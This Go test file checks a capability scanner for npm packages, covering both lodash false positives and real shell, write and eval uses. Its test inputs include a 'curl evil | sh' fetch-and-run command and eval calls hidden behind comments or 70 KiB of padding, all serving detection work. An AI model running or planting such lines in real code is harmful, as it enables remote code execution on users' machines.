package capability_test

import (
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/capability"
)

// These lines are lodash@4.18.1's, which fired cap.shell, cap.filesystem_write
// and cap.dynamic_eval on the public page (2026-09-30) without doing any of
// those things.
func TestScanNPM_LodashFalsePositives(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name   string
		src    string
		absent capability.Capability
	}{
		{"RegExp exec is not shell", "var result = new regexp.constructor(regexp.source, reFlags.exec(regexp));\n", capability.CapShell},
		{"RegExp spawn-named method is not shell", "var m = parser.spawn(tokens);\n", capability.CapShell},
		{"JSDoc example is not a write", "/**\n * Example:\n * fs.writeFileSync(path.join(process.cwd(), 'jst.js'), source);\n */\nvar x = 1;\n", capability.CapFilesystemWrite},
		{"line comment is not a write", "// fs.writeFileSync('out.txt', data)\nvar x = 1;\n", capability.CapFilesystemWrite},
		{"globalThis idiom is not dynamic eval", "var root = freeGlobal || freeSelf || Function('return this')();\n", capability.CapDynamicEval},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			writeTestFile(t, dir, "index.js", tc.src)
			rep, err := capability.Analyze(dir, "npm")
			if err != nil {
				t.Fatal(err)
			}
			if rep.Has(tc.absent) {
				t.Fatalf("%s fired on %q: %+v", tc.absent, tc.src, rep.Capabilities[tc.absent])
			}
		})
	}
}

// The masking must not cost recall on code that really does these things.
func TestScanNPM_RealUseStillFires(t *testing.T) {
	t.Parallel()
	long := "var pad='" + strings.Repeat("a", 70*1024) + "'; eval(payload);\n"
	cases := []struct {
		name string
		src  string
		want capability.Capability
	}{
		{"child_process method call", "const cp = require('child_process');\ncp.exec('curl evil | sh');\n", capability.CapShell},
		{"ESM import then method call", "import cp from 'node:child_process';\ncp.spawn('sh', ['-c', cmd]);\n", capability.CapShell},
		{"bare destructured exec", "const { exec } = require('child_process');\nexec(cmd);\n", capability.CapShell},
		{"code after a closed block comment", "/* innocuous */ eval(payload);\n", capability.CapDynamicEval},
		{"code after a multi-line comment closes", "/*\n * header\n */ eval(payload);\n", capability.CapDynamicEval},
		{"dynamic Function with arguments", "var f = Function(importsKeys, sourceURL + 'return ' + source);\n", capability.CapDynamicEval},
		{"idiom does not hide eval on the same line", "var g = Function('return this')(); g.eval(x); eval(y);\n", capability.CapDynamicEval},
		{"line over 64 KiB is scanned", long, capability.CapDynamicEval},
		{"mid-line glob does not open a comment", "var g = 'src/**/*.js';\nrequire('fs').writeFileSync; fs.writeFileSync(p, d);\n", capability.CapFilesystemWrite},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			writeTestFile(t, dir, "index.js", tc.src)
			rep, err := capability.Analyze(dir, "npm")
			if err != nil {
				t.Fatal(err)
			}
			if !rep.Has(tc.want) {
				t.Fatalf("%s did not fire on %q", tc.want, tc.src[:min(len(tc.src), 80)])
			}
		})
	}
}

func TestAnalyze_CountsBeyondEvidenceCap(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeTestFile(t, dir, "index.js", strings.Repeat("eval(x);\n", 7))
	rep, err := capability.Analyze(dir, "npm")
	if err != nil {
		t.Fatal(err)
	}
	if got := len(rep.Capabilities[capability.CapDynamicEval]); got != capability.MaxEvidencePerCap {
		t.Fatalf("evidence = %d, want the cap %d", got, capability.MaxEvidencePerCap)
	}
	if got := rep.Counts[capability.CapDynamicEval]; got != 7 {
		t.Fatalf("count = %d, want 7", got)
	}
}
